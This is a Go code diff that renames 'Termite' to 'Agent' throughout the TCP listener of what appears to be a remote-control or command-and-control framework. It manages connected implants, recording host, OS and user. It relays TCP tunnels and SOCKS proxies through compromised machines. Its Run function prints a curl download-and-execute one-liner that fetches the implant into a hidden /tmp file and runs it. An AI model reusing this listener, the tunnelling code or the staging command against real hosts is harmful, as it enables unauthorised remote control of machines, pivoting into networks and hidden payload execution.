@@ -38,7 +38,7 @@ type TCPServer struct {
 	Host           string                      `json:"host"`
 	GroupDispatch  bool                        `json:"group_dispatch"`
 	Port           uint16                      `json:"port"`
-	TermiteClients map[string](*TermiteClient) `json:"termite_clients"`
+	AgentClients map[string](*AgentClient) `json:"agent_clients"`
 	TimeStamp      time.Time                   `json:"timestamp"`
 	Interfaces     []string                    `json:"interfaces"`
 	Hash           string                      `json:"hash"`
@@ -72,7 +72,7 @@ func CreateTCPServer(host string, port uint16, hashFormat string, disableHistory
 		Host:           host,
 		Port:           port,
 		GroupDispatch:  true,
-		TermiteClients: make(map[string](*TermiteClient)),
+		AgentClients: make(map[string](*AgentClient)),
 		Interfaces:     []string{},
 		TimeStamp:      time.Now(),
 		hashFormat:     hashFormat,
@@ -135,11 +135,11 @@ func CreateTCPServer(host string, port uint16, hashFormat string, disableHistory
 }
 
 func (s *TCPServer) Handle(conn net.Conn) {
-	client := CreateTermiteClient(conn, s, s.DisableHistory)
+	client := CreateAgentClient(conn, s, s.DisableHistory)
 	log.Info("Gathering information from client...")
 	if client.GatherClientInfo(s.hashFormat) {
-		log.Info("A new encrypted termite (%s) income connection from %s", client.Version, client.conn.RemoteAddr())
-		s.AddTermiteClient(client)
+		log.Info("Agent (v%s) connected from %s", client.Version, client.conn.RemoteAddr())
+		s.AddAgentClient(client)
 	} else {
 		log.Info("Failed to check encrypted income connection from %s", client.conn.RemoteAddr())
 		client.Close()
@@ -179,7 +179,7 @@ func (s *TCPServer) Run() {
 		for _, ifaddr := range Ctx.Distributor.(*Distributor).Interfaces {
 			distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.(*Distributor).Port)
 			filename := fmt.Sprintf("/tmp/.%s", str.RandomString(0x08))
-			command := "curl -fsSL http://" + distributorHostPort + "/termite/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && " + filename
+			command := "curl -fsSL http://" + distributorHostPort + "/agent/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && " + filename
 			log.Warn("\t`%s`", command)
 		}
 	}
@@ -200,7 +200,7 @@ func (s *TCPServer) Run() {
 }
 
 func (s *TCPServer) AsTable() {
-	if len(s.TermiteClients) > 0 {
+	if len(s.AgentClients) > 0 {
 		t := table.NewWriter()
 		t.SetOutputMirror(os.Stdout)
 		t.SetTitle(fmt.Sprintf(
@@ -208,12 +208,12 @@ func (s *TCPServer) AsTable() {
 			s.Hash,
 			s.Host,
 			s.Port,
-			len(s.TermiteClients),
+			len(s.AgentClients),
 		))
 
 		t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Python", "Time", "Alias", "GroupDispatch"})
 
-		for chash, client := range s.TermiteClients {
+		for chash, client := range s.AgentClients {
 			t.AppendRow([]interface{}{
 				chash,
 				client.conn.RemoteAddr().String(),
@@ -228,7 +228,7 @@ func (s *TCPServer) AsTable() {
 
 		t.Render()
 		log.Success("%s is listening on %s:%d, %d clients listed",
-			s.Hash, s.Host, s.Port, len(s.TermiteClients))
+			s.Hash, s.Host, s.Port, len(s.AgentClients))
 	} else {
 		log.Warn("[%s] is listening on %s:%d, 0 clients",
 			s.Hash, s.Host, s.Port)
@@ -242,7 +242,7 @@ func (s *TCPServer) OnelineDesc() string {
 			"%s:%d (%d online clients)",
 			s.Host,
 			s.Port,
-			len(s.TermiteClients),
+			len(s.AgentClients),
 		),
 	)
 	return buffer.String()
@@ -256,12 +256,12 @@ func (s *TCPServer) FullDesc() string {
 			s.Hash,
 			s.Host,
 			s.Port,
-			len(s.TermiteClients),
+			len(s.AgentClients),
 			humanize.Time(s.TimeStamp),
 		),
 	)
 	var descs []string
-	for _, client := range s.TermiteClients {
+	for _, client := range s.AgentClients {
 		descs = append(descs, fmt.Sprintf("\t%s", client.FullDesc()))
 	}
 	if len(descs) > 0 {
@@ -275,8 +275,8 @@ func (s *TCPServer) Stop() {
 	log.Info("Stopping server: %s", s.OnelineDesc())
 	s.stopped <- struct{}{}
 
-	for _, client := range s.TermiteClients {
-		s.DeleteTermiteClient(client)
+	for _, client := range s.AgentClients {
+		s.DeleteAgentClient(client)
 	}
 }
 
@@ -288,10 +288,10 @@ const (
 	SERVER_DUPLICATED
 )
 
-func (s *TCPServer) NotifyWebSocketDuplicateTermiteClient(client *TermiteClient) {
+func (s *TCPServer) NotifyWebSocketDuplicateAgentClient(client *AgentClient) {
 	// WebSocket Broadcast
 	type ClientDuplicateMessage struct {
-		Client     TermiteClient
+		Client     AgentClient
 		ServerHash string
 	}
 	msg, _ := json.Marshal(WebSocketMessage{
@@ -307,10 +307,10 @@ func (s *TCPServer) NotifyWebSocketDuplicateTermiteClient(client *TermiteClient)
 	}
 }
 
-func (s *TCPServer) NotifyWebSocketOnlineTermiteClient(client *TermiteClient) {
+func (s *TCPServer) NotifyWebSocketOnlineAgentClient(client *AgentClient) {
 	// WebSocket Broadcast
 	type ClientOnlineMessage struct {
-		Client     TermiteClient
+		Client     AgentClient
 		ServerHash string
 	}
 	msg, _ := json.Marshal(WebSocketMessage{
@@ -327,12 +327,12 @@ func (s *TCPServer) NotifyWebSocketOnlineTermiteClient(client *TermiteClient) {
 }
 
 // Encrypted clients
-func (s *TCPServer) AddTermiteClient(client *TermiteClient) {
+func (s *TCPServer) AddAgentClient(client *AgentClient) {
 	client.GroupDispatch = s.GroupDispatch
-	if _, exists := s.TermiteClients[client.Hash]; exists {
+	if _, exists := s.AgentClients[client.Hash]; exists {
 		log.Error("Duplicated income connection detected!")
 
-		// Respond to termite client that the client is duplicated
+		// Respond to agent that the client is duplicated
 		err := client.Send(&agentpb.Envelope{
 			Payload: &agentpb.Envelope_DuplicateClient{
 				DuplicateClient: &agentpb.DuplicateClientNotice{},
@@ -344,23 +344,23 @@ func (s *TCPServer) AddTermiteClient(client *TermiteClient) {
 			log.Error("Network error: %s", err)
 		}
 
-		s.NotifyWebSocketDuplicateTermiteClient(client)
+		s.NotifyWebSocketDuplicateAgentClient(client)
 		client.Close()
 	} else {
 		log.Success("Encrypted fire in the hole: %s", client.OnelineDesc())
-		s.TermiteClients[client.Hash] = client
-		s.NotifyWebSocketOnlineTermiteClient(client)
+		s.AgentClients[client.Hash] = client
+		s.NotifyWebSocketOnlineAgentClient(client)
 		// Message Dispatcher
-		go func(client *TermiteClient) { TermiteMessageDispatcher(client) }(client)
+		go func(client *AgentClient) { AgentMessageDispatcher(client) }(client)
 	}
 }
 
-func TermiteMessageDispatcher(client *TermiteClient) {
+func AgentMessageDispatcher(client *AgentClient) {
 	for {
 		env, err := client.Recv()
 		if err != nil {
 			log.Error("Read from client %s failed", client.OnelineDesc())
-			DeleteTermiteClient(client)
+			DeleteAgentClient(client)
 			break
 		}
 
@@ -405,7 +405,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 						n, err := (*ti.Conn).Read(buffer)
 						if err != nil {
 							log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
-							ti.Termite.(*TermiteClient).Send(&agentpb.Envelope{
+							ti.Agent.(*AgentClient).Send(&agentpb.Envelope{
 								Payload: &agentpb.Envelope_TunnelCloseRequest{
 									TunnelCloseRequest: &agentpb.TunnelCloseRequest{TunnelId: token},
 								},
@@ -414,7 +414,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 							break
 						}
 						if n > 0 {
-							WriteTunnel(ti.Termite.(*TermiteClient), token, buffer[0:n])
+							WriteTunnel(ti.Agent.(*AgentClient), token, buffer[0:n])
 						}
 					}
 				}()
@@ -441,7 +441,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 			}
 			if ti, exists := Ctx.PushTunnelInstance[token]; exists {
 				if _, err := (*ti.Conn).Write(data); err != nil {
-					ti.Termite.(*TermiteClient).Send(&agentpb.Envelope{
+					ti.Agent.(*AgentClient).Send(&agentpb.Envelope{
 						Payload: &agentpb.Envelope_TunnelConnectFailed{
 							TunnelConnectFailed: &agentpb.TunnelConnectFailed{TunnelId: token, Reason: err.Error()},
 						},
@@ -459,15 +459,15 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 				conn, err := net.Dial("tcp", tc.Address)
 				if err != nil {
 					log.Error("Connecting to %s failed: %s", tc.Address, err.Error())
-					tc.Termite.(*TermiteClient).Send(&agentpb.Envelope{
+					tc.Agent.(*AgentClient).Send(&agentpb.Envelope{
 						Payload: &agentpb.Envelope_TunnelConnectFailed{
 							TunnelConnectFailed: &agentpb.TunnelConnectFailed{TunnelId: token, Reason: err.Error()},
 						},
 					})
 				} else {
 					log.Success("Connecting to %s succeed", tc.Address)
-					Ctx.PushTunnelInstance[token] = app.PushTunnelInstance{Termite: tc.Termite, Conn: &conn}
-					tc.Termite.(*TermiteClient).Send(&agentpb.Envelope{
+					Ctx.PushTunnelInstance[token] = app.PushTunnelInstance{Agent: tc.Agent, Conn: &conn}
+					tc.Agent.(*AgentClient).Send(&agentpb.Envelope{
 						Payload: &agentpb.Envelope_TunnelConnectedResponse{
 							TunnelConnectedResponse: &agentpb.TunnelConnectedResponse{TunnelId: token},
 						},
@@ -477,7 +477,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 							buffer := make([]byte, 0x400)
 							n, err := conn.Read(buffer)
 							if err != nil {
-								tc.Termite.(*TermiteClient).Send(&agentpb.Envelope{
+								tc.Agent.(*AgentClient).Send(&agentpb.Envelope{
 									Payload: &agentpb.Envelope_TunnelDisconnected{
 										TunnelDisconnected: &agentpb.TunnelDisconnectedNotice{TunnelId: token, Reason: err.Error()},
 									},
@@ -486,7 +486,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 								delete(Ctx.PushTunnelInstance, token)
 								break
 							}
-							tc.Termite.(*TermiteClient).Send(&agentpb.Envelope{
+							tc.Agent.(*AgentClient).Send(&agentpb.Envelope{
 								Payload: &agentpb.Envelope_TunnelData{
 									TunnelData: &agentpb.TunnelData{TunnelId: token, Data: buffer[0:n]},
 								},
@@ -517,7 +517,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 			localAddr := fmt.Sprintf("127.0.0.1:%d", freeport.GetPort())
 			remoteAddr := fmt.Sprintf("127.0.0.1:%d", port)
 			log.Success("Mapping remote socks server (%s) into local address (%s)", remoteAddr, localAddr)
-			AddPullTunnelConfig(Ctx.CurrentTermite.(*TermiteClient), localAddr, remoteAddr)
+			AddPullTunnelConfig(Ctx.CurrentAgent.(*AgentClient), localAddr, remoteAddr)
 		case *agentpb.Envelope_Socks5CreateFailed:
 			log.Error("%s", p.Socks5CreateFailed.Reason)
 
@@ -539,11 +539,11 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 	}
 }
 
-func (s *TCPServer) DeleteTermiteClient(client *TermiteClient) {
-	delete(s.TermiteClients, client.Hash)
+func (s *TCPServer) DeleteAgentClient(client *AgentClient) {
+	delete(s.AgentClients, client.Hash)
 	client.Close()
 }
 
-func (s *TCPServer) GetAllTermiteClients() map[string](*TermiteClient) {
-	return s.TermiteClients
+func (s *TCPServer) GetAllAgentClients() map[string](*AgentClient) {
+	return s.AgentClients
 }
